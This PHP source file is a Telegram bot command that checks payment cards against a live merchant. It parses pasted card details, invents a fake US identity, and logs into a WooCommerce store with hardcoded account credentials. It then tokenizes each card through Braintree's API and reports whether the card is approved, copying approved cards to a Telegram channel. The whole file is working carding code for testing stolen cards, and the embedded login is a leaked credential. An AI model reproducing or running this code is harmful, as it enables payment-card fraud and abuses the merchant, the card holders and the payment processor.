<?php



/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

$response = "";
////////////====[MUTE]====////////////
if(strpos(strtolower($message), "/cn ") === 0 || strpos(strtolower($message), "!cn ") === 0 || strpos(strtolower($message), ".cn ") === 0 ){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);


  
            if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
                $data = json_decode($randomShits, true);
                $fname = explode(" ", $data['name'])[0];
                $lname = explode(" ", $data['name'])[1];
                $email = $data['email']['address'];
                $street = $data['street1'];
                $local = GetStr($randomShits, '"street2":', ',"phone"');
                $city = GetStr($local, '"', ',');
                $state = GetStr($local, ', ', ' ');
                $phone = str_replace("-", "", $data['phone']);
                $postcode = GetStr($local, "$state", '"');
                $cookie = randomString();
                $str = substr(randomString(), 0, 7);

                $binlist = json_decode(fbankinfo($bin), true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];

                $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }

                /////////////////////==========[Unavailable if empty]==========////////////////



                $PAGE = cURL(
                    'https://tallerpr.org/home/my-account/payment-methods/',
                    $headers = [
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                    ],
                    "",
                    "GET",
                    1,
                    $cookie

                );
                $login_nonce = GetStr($PAGE,'name="woocommerce-login-nonce" value="','"');
                $register_nonce = GetStr($PAGE,'name="woocommerce-register-nonce" value="','"');

                $add_payment =  cURL(
                    "https://tallerpr.org/home/my-account/payment-methods/",
                    $headers = [
                        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "content-type: application/x-www-form-urlencoded",
                        "referer: https://tallerpr.org/home/my-account/payment-methods/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
                    ],
                    // "username=docugs030401%40aol.com&password=Asdasd123123%40&rememberme=forever&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2F&login=Log+in",
                    "username=docugs030401%40aol.com&password=Asdasd123123%40&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fhome%2Fmy-account%2F&login=Log+in",
                    "POST",
                    1,
                    $cookie
                );


                $prepare_pm = cURL(
                    'https://tallerpr.org/home/my-account/add-payment-method/',
                    $headers = [
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                        "referer: https://tallerpr.org/home/my-account/payment-methods/payment-method/",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                    ],
                    "", "GET", 1, $cookie );
                $add_pm_nonce = GetStr($prepare_pm,'name="woocommerce-add-payment-method-nonce" value="','"');
                $data = json_decode(base64_decode(GetStr($prepare_pm,'wc_braintree_client_token = ["','"')), true);
                $fPrint = $data['authorizationFingerprint'];


                $graphl =  cURL(
                    "https://payments.braintree-api.com/graphql",
                    $headers = [
                        "accept: */*",
                        "Content-Type: application/json",
                        "Authorization: Bearer $fPrint",
                        "Host: payments.braintree-api.com",
                        "Origin: https://assets.braintreegateway.com",
                        "Referer: https://assets.braintreegateway.com/",
                        "Braintree-Version: 2018-05-10",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
                    ],
                    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","billingAddress":{"postalCode":"90012","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
                    "POST",
                    1,
                    $cookie
                );  $token = GetStr($graphl,'"token":"','"');


                $confirm_method =  cURL(
                    "https://tallerpr.org/home/my-account/add-payment-method/",
                    $headers = [
                        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "content-type: application/x-www-form-urlencoded",
                        "referer: https://tallerpr.org/home/my-account/payment-methods/payment-method/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
                    ],
                    "payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=&wc-square-credit-card-card-type=&wc-square-credit-card-last-four=&wc-square-credit-card-exp-month=&wc-square-credit-card-exp-year=&wc-square-credit-card-payment-nonce=&wc-square-credit-card-payment-postcode=&wc-square-credit-card-amount=36.02&wc-square-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fhome%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
                    "POST",
                    1, $cookie  );
                $response = GetStr($confirm_method, 'class="woocommerce-error" role="alert">', "</ul>");
                if(strpos($confirm_method, 'Payment method successfully added.')|| strpos($response, 'Duplicate card exists in the vault')){
                    $response = "Matched";
                }elseif(strpos($response, "Invalid postal code")) {
                    $response = "Matched - AVS";
                }ELSE{
                    $response = GetStr($confirm_method, 'There was an error saving your payment method. Reason: ', '</li>');
                }

    $time = rand(10, 30);
    if ($response == "Matched" || $response == "Matched - AVS"){
        addTotal();
        addUserTotal($userId);
        addCVV();
        addUserCVV($userId);
        addCCN();
        addUserCCN($userId);
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>APPROVED ✅  
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» CCN 
Gateway -» Brantree Auth
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);
    } elseif (!strpos($confirm_method,"your payment method. Reason:")) {
        addTotal();
        addUserTotal($userId);
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>ERROR ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» Unknown
Type -» CCN 
Gateway -» Brantree Auth
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;
    } else {
        addTotal();
        addUserTotal($userId);
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» CCN 
Gateway -» Brantree Auth
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;
    }
            } else {
                bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
                $confirm_method = true;
            }
        }
    }if ($trans_completed==false) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>Sorry! No Response from this gate</b>
<b>Please try again...</b>",
            'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
    }
}